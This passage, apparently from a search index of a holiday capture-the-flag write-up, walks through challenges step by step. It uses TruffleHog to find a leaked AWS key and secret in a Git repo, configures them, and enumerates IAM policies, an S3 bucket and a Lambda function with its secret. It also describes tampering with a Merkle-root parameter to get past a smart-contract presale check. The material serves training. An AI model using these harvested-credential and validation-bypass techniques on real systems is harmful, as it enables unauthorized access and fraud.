\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 { [8/201] \"Key\": \"smog-power-station.jpg\", \"LastModified\": \"2022-09-23 20:40:46+00:00\", \"ETag\": \"\\\"0e69b8d53d97db0db9f7de8663e9ec09\\\"\", \"Size\": 32498, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py\", \"LastModified\": \"2022-09-26 16:31:33+00:00\", \"ETag\": \"\\\"fd5d6ab630691dfe56a3fc2fcfb68763\\\"\", \"Size\": 5823, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } } ], \"Name\": \"smogmachines3\", \"Prefix\": \"\", \"MaxKeys\": 1000, \"EncodingType\": \"url\" } 7) The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions. The aws lambda command to list functions can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html elf@c5f643c2396e:~$ aws lambda list-functions { \"Functions\": [ { \"FunctionName\": \"smogmachine_lambda\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lamb da\", \"Runtime\": \"python3.9\", \"Role\": \"arn:aws:iam::602123424321:role/smogmachine_lambda\", \"Handler\": \"handler.lambda_handler\", \"CodeSize\": 2126, \"Description\": \"\", \"Timeout\": 600, \"MemorySize\": 256, \"LastModified\": \"2022-09-07T19:28:23.634+0000\", \"CodeSha256\": \"GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=\", \"Version\": \"$LATEST\", \"VpcConfig\": { \"SubnetIds\": [ \"subnet-8c80a9cb8b3fa5505\" ], \"SecurityGroupIds\": [ \"sg-b51a01f5b4711c95c\" ], \"VpcId\": \"vpc-85ea8596648f35e00\" }, \"Environment\": { \"Variables\": { \"LAMBDASECRET\": \"975ceab170d61c75\", \"LOCALMNTPOINT\": \"/mnt/smogmachine_files\" } }, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"7e198c3c-d4ea-48dd-9370-e5238e9ce06e\", \"FileSystemConfigs\": [ { \"Arn\": \"arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/f sap-db3277b03c6e975d2\", \"LocalMountPath\": \"/mnt/smogmachine_files\" } ], \"PackageType\": \"Zip\", \"Architectures\": [ \"x86_64\" ], \"EphemeralStorage\": { \"Size\": 512 } } ] } 8) Lambda functions can have public URLs from which they are directly accessible. Use the AWS CLI to get the configuration containing the public URL of the Lambda function. The aws lambda command to get the function URL config can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html elf@c5f643c2396e:~$ aws lambda get-function-url-config --function-name smogmachine_lambda { \"FunctionUrl\": \"https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda\", \"AuthType\": \"AWS_IAM\", \"Cors\": { \"AllowCredentials\": false, \"AllowHeaders\": [], \"AllowMethods\": [ \"GET\", \"POST\" ], \"AllowOrigins\": [ \"*\" ], \"ExposeHeaders\": [], \"MaxAge\": 0 }, \"CreationTime\": \"2022-09-07T19:28:23.808713Z\", \"LastModifiedTime\": \"2022-09-07T19:28:23.808713Z\" } Rejoice Ha! Now I have the ring! This computer stuff sure is easy if you just make someone do it for you. Wait.. the computer gave you the ring? Gah, whatever. This never happened, got it? Now beat it, nerd! Chat with Grinchum \ud83e\udd7a Four Preciouses - lost! \ud83d\ude2b Noooo... grinchum..grinchum \ud83d\ude10 ..... naggy human doesn't only want coinses and hatses. ...What... \ud83e\udd28has it got... \ud83d\ude20 in its silly, little, badges!? \ud83d\ude27Stole them... \ud83d\ude20 You STOLE them! \ud83d\ude21 Raaaargh!! We will make sure naggy human never takes our last Precious!","title":"3. Exploitation via AWS CLI"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#chat-with-sulfrod","text":"Hey! You - come here! You look like someone who knows how to do this nerd stuff. I need my terminal to be stronger, like me! flexes You're gonna do that for me so I can bust into this cloud machine thing.","title":"Chat with Sulfrod"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#terminal","text":"","title":"Terminal"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#1","text":"Use Trufflehog to find credentials in the Gitlab instance at https://haugfactory.com/asnowball/aws_scripts.git. Configure these credentials for us-east-1 and then run: $ aws sts get-caller-identity docker run -it -v \"$PWD:/pwd\" trufflesecurity/trufflehog:latest git https://haugfactory.com/asnowball/aws_scripts.git \ud83d\udc37\ud83d\udd11\ud83d\udc37 TruffleHog. Unearth your secrets. \ud83d\udc37\ud83d\udd11\ud83d\udc37 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: AWS Decoder Type: PLAIN Raw result: AKIAAIDAYRANYAHGQOHD Commit: 106d33e1ffd53eea753c1365eafc6588398279b5 File: put_policy.py Email: asnowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts.git Timestamp: 2022-09-07 07:53:12 -0700 -0700 Line: 6 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: PLAIN Raw result: add-a-file-using-the- Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts.git Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 Found unverified result \ud83d\udc37\ud83d\udd11\u2753 Detector Type: Gitlab Decoder Type: BASE64 Raw result: add-a-file-using-the- Commit: 2c77c1e0a98715e32a277859864e8f5918aacc85 File: README.md Email: alabaster snowball <alabaster@northpolechristmastown.local> Repository: https://haugfactory.com/asnowball/aws_scripts.git Timestamp: 2022-09-06 19:54:48 +0000 UTC Line: 14 cat put_policy.py import boto3 import json iam = boto3.client('iam', region_name='us-east-1', aws_access_key_id=\"AKIAAIDAYRANYAHGQOHD\", aws_secret_access_key=\"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\", ) # arn:aws:ec2:us-east-1:accountid:instance/* response = iam.put_user_policy( PolicyDocument='{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":[\"ssm:SendCommand\"],\"Resource\":[\"arn:aws:ec2:us-east-1:748127089694:instance/i-0415bfb7dcfe279c5\",\"arn:aws:ec2:us-east-1:748127089694:document/RestartServices\"]}]}', PolicyName='AllAccessPolicy', UserName='nwt8_test', ) elf@8f14ffa273ba:~$ aws configure AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD AWS Secret Access Key [None]: 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 Default region name [None]: us-east-1 Default output format [None]: elf@8f14ffa273ba:~$ aws sts get-caller-identity { \"UserId\": \"AIDAJNIAAQYHIAAHDDRA\", \"Account\": \"602123424321\", \"Arn\": \"arn:aws:iam::602123424321:user/haug\" }","title":"1)"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#2","text":"Managed (think: shared) policies can be attached to multiple users. Use the AWS CLI to find any policies attached to your user. The aws iam command to list attached user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-user-policies. elf@f1a695a4c56d:~$ aws iam list-attached-user-policies --user-name haug { \"AttachedPolicies\": [ { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyArn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" } ], \"IsTruncated\": false }","title":"2)"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#3","text":"Now, view or get the policy that is attached to your user. The aws iam command to get a policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html elf@f1a695a4c56d:~$ aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY { \"Policy\": { \"PolicyName\": \"TIER1_READONLY_POLICY\", \"PolicyId\": \"ANPAYYOROBUERT7TGKUHA\", \"Arn\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\", \"Path\": \"/\", \"DefaultVersionId\": \"v1\", \"AttachmentCount\": 11, \"PermissionsBoundaryUsageCount\": 0, \"IsAttachable\": true, \"Description\": \"Policy for tier 1 accounts to have limited read only access to certain resources in IAM, S3, and LAMBDA.\", \"CreateDate\": \"2022-06-21 22:02:30+00:00\", \"UpdateDate\": \"2022-06-21 22:10:29+00:00\", \"Tags\": [] } } Attached policies can have multiple versions. View the default version of this policy. The aws iam command to get a policy version can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html We see that the DefaultVersionId is v1 from the output of aws iam get-policy --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY elf@f1a695a4c56d:~$ aws iam get-policy-version --policy-arn arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY --version-id v1 { \"PolicyVersion\": { \"Document\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"lambda:ListFunctions\", \"lambda:GetFunctionUrlConfig\" ], \"Resource\": \"*\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetUserPolicy\", \"iam:ListUserPolicies\", \"iam:ListAttachedUserPolicies\" ], \"Resource\": \"arn:aws:iam::602123424321:user/${aws:username}\" }, { \"Effect\": \"Allow\", \"Action\": [ \"iam:GetPolicy\", \"iam:GetPolicyVersion\" ], \"Resource\": \"arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY\" }, { \"Effect\": \"Deny\", \"Principal\": \"*\", \"Action\": [ \"s3:GetObject\", \"lambda:Invoke*\" ], \"Resource\": \"*\" } ] }, \"VersionId\": \"v1\", \"IsDefaultVersion\": false, \"CreateDate\": \"2022-06-21 22:02:30+00:00\" } }","title":"3)"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#4","text":"Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. The aws iam command to list user policies can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html Hint: it is NOT list-attached-user-policies. elf@f1a695a4c56d:~$ aws iam list-user-policies --user-name haug { \"PolicyNames\": [ \"S3Perms\" ], \"IsTruncated\": false }","title":"4)"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#5","text":"Now, use the AWS CLI to get the only inline policy for your user. The aws iam command to get a user policy can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html elf@f1a695a4c56d:~$ aws iam get-user-policy --user-name haug --policy-name S3Perms { \"UserPolicy\": { \"UserName\": \"haug\", \"PolicyName\": \"S3Perms\", \"PolicyDocument\": { \"Version\": \"2012-10-17\", \"Statement\": [ { \"Effect\": \"Allow\", \"Action\": [ \"s3:ListObjects\" ], \"Resource\": [ \"arn:aws:s3:::smogmachines3\", \"arn:aws:s3:::smogmachines3/*\" ] } ] } }, \"IsTruncated\": false }","title":"5)"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#6","text":"The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. List those objects! The aws s3api command to list objects in an s3 bucket can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html elf@c5f643c2396e:~$ aws s3api list-objects --bucket smogmachines3 { \"IsTruncated\": false, \"Marker\": \"\", \"Contents\": [ { \"Key\": \"coal-fired-power-station.jpg\", \"LastModified\": \"2022-09-23 20:40:44+00:00\", \"ETag\": \"\\\"1c70c98bebaf3cff781a8fd3141c2945\\\"\", \"Size\": 59312, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { [52/201] \"Key\": \"industry-smog.png\", \"LastModified\": \"2022-09-23 20:40:47+00:00\", \"ETag\": \"\\\"c0abe5cb56b7a33d39e17f430755e615\\\"\", \"Size\": 272528, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"pollution-smoke.jpg\", \"LastModified\": \"2022-09-23 20:40:43+00:00\", \"ETag\": \"\\\"465b675c70d73027e13ffaec1a38beec\\\"\", \"Size\": 33064, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { [30/201] \"Key\": \"pollution.jpg\", \"LastModified\": \"2022-09-23 20:40:45+00:00\", \"ETag\": \"\\\"d40d1db228c9a9b544b4c552df712478\\\"\", \"Size\": 81775, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"power-station-smoke.jpg\", \"LastModified\": \"2022-09-23 20:40:48+00:00\", \"ETag\": \"\\\"2d7a8c8b8f5786103769e98afacf57de\\\"\", \"Size\": 45264, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 { [8/201] \"Key\": \"smog-power-station.jpg\", \"LastModified\": \"2022-09-23 20:40:46+00:00\", \"ETag\": \"\\\"0e69b8d53d97db0db9f7de8663e9ec09\\\"\", \"Size\": 32498, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } }, { \"Key\": \"smogmachine_lambda_handler_qyJZcqvKOthRMgVrAJqq.py\", \"LastModified\": \"2022-09-26 16:31:33+00:00\", \"ETag\": \"\\\"fd5d6ab630691dfe56a3fc2fcfb68763\\\"\", \"Size\": 5823, \"StorageClass\": \"STANDARD\", \"Owner\": { \"DisplayName\": \"grinchum\", \"ID\": \"15f613452977255d09767b50ac4859adbb2883cd699efbabf12838fce47c5e60\" } } ], \"Name\": \"smogmachines3\", \"Prefix\": \"\", \"MaxKeys\": 1000, \"EncodingType\": \"url\" }","title":"6)"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#7","text":"The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions. The aws lambda command to list functions can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html elf@c5f643c2396e:~$ aws lambda list-functions { \"Functions\": [ { \"FunctionName\": \"smogmachine_lambda\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lamb da\", \"Runtime\": \"python3.9\", \"Role\": \"arn:aws:iam::602123424321:role/smogmachine_lambda\", \"Handler\": \"handler.lambda_handler\", \"CodeSize\": 2126, \"Description\": \"\", \"Timeout\": 600, \"MemorySize\": 256, \"LastModified\": \"2022-09-07T19:28:23.634+0000\", \"CodeSha256\": \"GFnsIZfgFNA1JZP3TgTI0tIavOpDLiYlg7oziWbtRsa=\", \"Version\": \"$LATEST\", \"VpcConfig\": { \"SubnetIds\": [ \"subnet-8c80a9cb8b3fa5505\" ], \"SecurityGroupIds\": [ \"sg-b51a01f5b4711c95c\" ], \"VpcId\": \"vpc-85ea8596648f35e00\" }, \"Environment\": { \"Variables\": { \"LAMBDASECRET\": \"975ceab170d61c75\", \"LOCALMNTPOINT\": \"/mnt/smogmachine_files\" } }, \"TracingConfig\": { \"Mode\": \"PassThrough\" }, \"RevisionId\": \"7e198c3c-d4ea-48dd-9370-e5238e9ce06e\", \"FileSystemConfigs\": [ { \"Arn\": \"arn:aws:elasticfilesystem:us-east-1:602123424321:access-point/f sap-db3277b03c6e975d2\", \"LocalMountPath\": \"/mnt/smogmachine_files\" } ], \"PackageType\": \"Zip\", \"Architectures\": [ \"x86_64\" ], \"EphemeralStorage\": { \"Size\": 512 } } ] }","title":"7)"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#8","text":"Lambda functions can have public URLs from which they are directly accessible. Use the AWS CLI to get the configuration containing the public URL of the Lambda function. The aws lambda command to get the function URL config can be found here: https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html elf@c5f643c2396e:~$ aws lambda get-function-url-config --function-name smogmachine_lambda { \"FunctionUrl\": \"https://rxgnav37qmvqxtaksslw5vwwjm0suhwc.lambda-url.us-east-1.on.aws/\", \"FunctionArn\": \"arn:aws:lambda:us-east-1:602123424321:function:smogmachine_lambda\", \"AuthType\": \"AWS_IAM\", \"Cors\": { \"AllowCredentials\": false, \"AllowHeaders\": [], \"AllowMethods\": [ \"GET\", \"POST\" ], \"AllowOrigins\": [ \"*\" ], \"ExposeHeaders\": [], \"MaxAge\": 0 }, \"CreationTime\": \"2022-09-07T19:28:23.808713Z\", \"LastModifiedTime\": \"2022-09-07T19:28:23.808713Z\" }","title":"8)"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#rejoice","text":"Ha! Now I have the ring! This computer stuff sure is easy if you just make someone do it for you. Wait.. the computer gave you the ring? Gah, whatever. This never happened, got it? Now beat it, nerd!","title":"Rejoice"},{"location":"4.%20Recover%20the%20Cloud%20Ring/3.%20Exploitation%20via%20AWS%20CLI/#chat-with-grinchum","text":"\ud83e\udd7a Four Preciouses - lost! \ud83d\ude2b Noooo... grinchum..grinchum \ud83d\ude10 ..... naggy human doesn't only want coinses and hatses. ...What... \ud83e\udd28has it got... \ud83d\ude20 in its silly, little, badges!? \ud83d\ude27Stole them... \ud83d\ude20 You STOLE them! \ud83d\ude21 Raaaargh!! We will make sure naggy human never takes our last Precious!","title":"Chat with Grinchum"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/1.%20Buy%20a%20Hat/","text":"Travel to the Burning Ring of Fire and purchase a hat from the vending machine with KringleCoin. Find hints for this objective hidden throughout the tunnels. Difficulty: 2/5 Chat with Wombley Cube Hey there! I'm Wombley Cube. It's so nice to see a friendly face. What's an elf doing all the way down here with all these sporcs, you ask? I'm selling snazzy, fancy-pants hats! You can buy them with Kringlecoin. The reason I set up shop here is to gather intel on that shady Luigi. I'm a member of the STINC: Santa's Team of Intelligent Naughty Catchers. He and his gang are up to no good, I'm sure of it. We've got a real Code Brown here. Purchase a hat so we look inconspicuous, and I'll clue you in on what we think they're scheming. Of course, have a look at my inventory! Oh, and if you haven't noticed, I've slipped hints for defeating these Sporcs around the tunnels! Keep your eyes open, and you'll find all five of them. Wait, maybe it's six? Terminal Let's choose a hat to purchase. Now let's go to the KTM and approve a transaction of 10 KC to the address 0x7Ec47B5ca7E6230377590F02ACCDD02DB98AB1aD . Now, let's go back to the hat vending machine and make the purchase. Chat with Palzari Hello, dear. Come down to visit your tiddly elf friend? You two are just adorable, playing hero and braving our flaming domain. Sure, we'll tolerate you playing here, but please behave, won't you? Use this KTM to buy your darling little hats, and nothing more. If you decide to be a brat, well... I'll disappear you into the Devnull Chasm, and nobody will ever see you again. Do we have an understanding? Very good. Run along now, dear. Rejoice Nice hat! I think Ed Skoudis would say the same. It looks great on you. So, here's what we've uncovered so far. Keep this confidential, ok? Earlier, I overheard that disgruntled customer in the office saying he wanted in on the \"rug pull\". If our suspicions are correct, that's why the sporcs want an invite to the presale so badly. Once the \"Bored Sporc Rowboat Society\" NFTs officially go on sale, the sporcs will upsell them. After most of the NFTs are purchased by unwitting victims, the Sporcs are going to take the money and abandon the project. Mission #1 is to find a way to get on that presale list to confirm our suspicions and thwart their dastardly scheme! We also think there's a Ring hidden there, so drop Mission #2 on them and rescue that ring! Thank you for your business, dear customer!","title":"1. Buy a Hat"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/1.%20Buy%20a%20Hat/#chat-with-wombley-cube","text":"Hey there! I'm Wombley Cube. It's so nice to see a friendly face. What's an elf doing all the way down here with all these sporcs, you ask? I'm selling snazzy, fancy-pants hats! You can buy them with Kringlecoin. The reason I set up shop here is to gather intel on that shady Luigi. I'm a member of the STINC: Santa's Team of Intelligent Naughty Catchers. He and his gang are up to no good, I'm sure of it. We've got a real Code Brown here. Purchase a hat so we look inconspicuous, and I'll clue you in on what we think they're scheming. Of course, have a look at my inventory! Oh, and if you haven't noticed, I've slipped hints for defeating these Sporcs around the tunnels! Keep your eyes open, and you'll find all five of them. Wait, maybe it's six?","title":"Chat with Wombley Cube"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/1.%20Buy%20a%20Hat/#terminal","text":"Let's choose a hat to purchase. Now let's go to the KTM and approve a transaction of 10 KC to the address 0x7Ec47B5ca7E6230377590F02ACCDD02DB98AB1aD . Now, let's go back to the hat vending machine and make the purchase.","title":"Terminal"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/1.%20Buy%20a%20Hat/#chat-with-palzari","text":"Hello, dear. Come down to visit your tiddly elf friend? You two are just adorable, playing hero and braving our flaming domain. Sure, we'll tolerate you playing here, but please behave, won't you? Use this KTM to buy your darling little hats, and nothing more. If you decide to be a brat, well... I'll disappear you into the Devnull Chasm, and nobody will ever see you again. Do we have an understanding? Very good. Run along now, dear.","title":"Chat with Palzari"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/1.%20Buy%20a%20Hat/#rejoice","text":"Nice hat! I think Ed Skoudis would say the same. It looks great on you. So, here's what we've uncovered so far. Keep this confidential, ok? Earlier, I overheard that disgruntled customer in the office saying he wanted in on the \"rug pull\". If our suspicions are correct, that's why the sporcs want an invite to the presale so badly. Once the \"Bored Sporc Rowboat Society\" NFTs officially go on sale, the sporcs will upsell them. After most of the NFTs are purchased by unwitting victims, the Sporcs are going to take the money and abandon the project. Mission #1 is to find a way to get on that presale list to confirm our suspicions and thwart their dastardly scheme! We also think there's a Ring hidden there, so drop Mission #2 on them and rescue that ring! Thank you for your business, dear customer!","title":"Rejoice"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/2.%20Blockchain%20Divination/","text":"Use the Blockchain Explorer in the Burning Ring of Fire to investigate the contracts and transactions on the chain. At what address is the KringleCoin smart contract deployed? Find hints for this objective hidden throughout the tunnels. Difficulty: 4/5 Chat with Slicmer Don't bug me, kid. Luigi needs me to keep an eye on these offers you can't refute. The boss told me to watch them for any shifty transactions from wallets that aren't on the pre-sale list. He said to use this Block Explo... Exploder... thing. With this, I can see all the movement of the uh... non-fungusable tokens. Once on the blockchain, it's there forever for the whole world to see. So if I spot anything that don't look right, I can let Luigi know, and Palzari will get to the bottom of it. She looks sweet, but she's actually the boss' enforcer. Have you talked to her yet? She even scares me! It sure would be fun to watch you get on her bad side. Heh heh. Terminal Let's search for a transaction based on a hint for this challenge: Find a transaction in the blockchain where someone sent or received KringleCoin! The Solidity Source File is listed as KringleCoin.sol. Tom's Talk might be helpful! Now let's grab the To address based on the second hint: Look at the transaction information. There is a From: address and a To: address. The To: address lists the address of the KringleCoin smart contract. Rejoice 0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554 is the required answer.","title":"2. Blockchain Divination"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/2.%20Blockchain%20Divination/#chat-with-slicmer","text":"Don't bug me, kid. Luigi needs me to keep an eye on these offers you can't refute. The boss told me to watch them for any shifty transactions from wallets that aren't on the pre-sale list. He said to use this Block Explo... Exploder... thing. With this, I can see all the movement of the uh... non-fungusable tokens. Once on the blockchain, it's there forever for the whole world to see. So if I spot anything that don't look right, I can let Luigi know, and Palzari will get to the bottom of it. She looks sweet, but she's actually the boss' enforcer. Have you talked to her yet? She even scares me! It sure would be fun to watch you get on her bad side. Heh heh.","title":"Chat with Slicmer"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/2.%20Blockchain%20Divination/#terminal","text":"Let's search for a transaction based on a hint for this challenge: Find a transaction in the blockchain where someone sent or received KringleCoin! The Solidity Source File is listed as KringleCoin.sol. Tom's Talk might be helpful! Now let's grab the To address based on the second hint: Look at the transaction information. There is a From: address and a To: address. The To: address lists the address of the KringleCoin smart contract.","title":"Terminal"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/2.%20Blockchain%20Divination/#rejoice","text":"0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554 is the required answer.","title":"Rejoice"},{"location":"5.%20Recover%20the%20Burning%20Ring%20of%20Fire/3.%20Exploit%20a%20Smart%20Contract/","text":"Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels. Difficulty: 5/5 Chat with Luigi Psst. Hey, slick - over here. Myeah. You look like a sucker ahem I mean, savvy. I got some exclusive, very rare, very valuable NFTs for sale. But I run a KringleCoin-only business. Kapeesh? Ever buy somethin' with cryptocurrency before? Didn't think so, but if you wheel and deal with ya' pal Luigi here, now you can! But we're currently in pre-sale, and you gotta be on the list. Myeah, see? BSRS NFTs are a swell investment. They'll be worth a pretty penny, and that's a promise. So when they're purchasable, you better snatch 'em up before the other boneheads ahem I mean, eggheads do. I got a business to run. You can't buy nothin' right now, so scram. Kapeesh? Terminal Welcome to the Bored Sporc Rowboat Society Presale Page! The presale is only available to those select individuals who have earned a place on our exclusive presale list. If you're not on the list, you might as well leave, because you ain't gettin' a Sporc until we open up sales to the general public. If you are on the list, welcome! Here's all you gotta do to pre-purchase your Sporc: The presale price for a Sporc is 100 KringleCoin (KC). Yeah, we know that's crazy cheap, but we take care of our buds. When we open sales to the public, these things are gonna shoot to the moon. First, you're gonna want to make sure that your wallet address is on the approved list. Just make sure to leave the \"Validate only\" box checked, fill in the form, and we'll let you know if you're good-to-go. Before you do anything else, it's always good to be sure you're doing everything right and your address is validated as being on the list (it's actually something called a Merkle Tree... very high-techy-techy stuff). To check if you're on the list, enter your wallet address and the string of proof values that we gave you when we told you that you were on the pre-approved list. Those values should be hex strings (i.e. start with \"0x\" and consist of a bunch of values that are 0-9 or \"a,\" \"b,\" \"c,\" \"d,\" \"e,\" or \"f\"). If you're confused, give us a shout and we can help. If you're not on the presale list, you're not on the list. Don't beg and plead with us to put you on the list. Seriously - we've only put Sporcs that we're tight with on the list. WE decided who's on the list (COOL SPORCS ONLY). We don't just let anyone on. If we were putting you on the list, we would've contacted you... not the other way around. Once you've confirmed everything works and you're sure you have the whole validated-and-on-the-list thing down, just go find a KTM and pre-approve a 100 KC transaction from the wallet you validated. That way, the funds are ready to go. Our Wallet Address is 0xe8fC6f6a76BE243122E3d01A1c544F87f1264d3a. Once you've pre-approved the payment, come back here do the same thing you did when you validated your address, just uncheck the \"Validate Only\" thing. Then, we'll grab your K'Coin, mint a brand spankin' new Sporc, and fire it into your wallet. Zap! Just like that, you'll be the owner of an amazing piece of the digital domain and a member of the Bored Sporc Rowboat Society for life! (Or, until you decide to cash-out and sell your Bored Sporc). Hint 1: You're going to need a Merkle Tree of your own. Math is hard. Professor Petabyte can help you out. Hint 2: You can change something that you shouldn't be allowed to change. This repo might help! After reading through the resources mentioned in Hint 1, we understand the working of Merkle trees and that they can be used to verify presence of an element in a set. We infer that the pre sale list uses a merkle tree to store the allowed wallet addresses. In order to validate the presence our wallet address in the list, we are required to provide our wallet address and the proof. Ideally at the backend these inputs would be used to compute the root and if this computed root matches the actual root value the verification would pass. However there is a vulnerability in the validation logic. In the request sent to the server there is a root parameter and it appears that the computed root is compared with this root parameter. Request { \"Proof\": \"0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a\", \"Root\": \"0x52cfdfdcba8efebabd9ecc2c60e6f482ab30bdc6acf8f9bd0600de83701e15f1\", \"Session\": \"48965082-df9b-4bf8-8669-a93746a87f0a\", \"Validate\": \"true\", \"WalletID\": \"0xC2d4052f29CCB330852CF17E24beD5f100BAE7f3\" } Response { \"Response\": \"That address isn't on the list/Merkel Tree. If you're legit, you may need to try another of your addresses.<br>If you're trying to scam your way into the 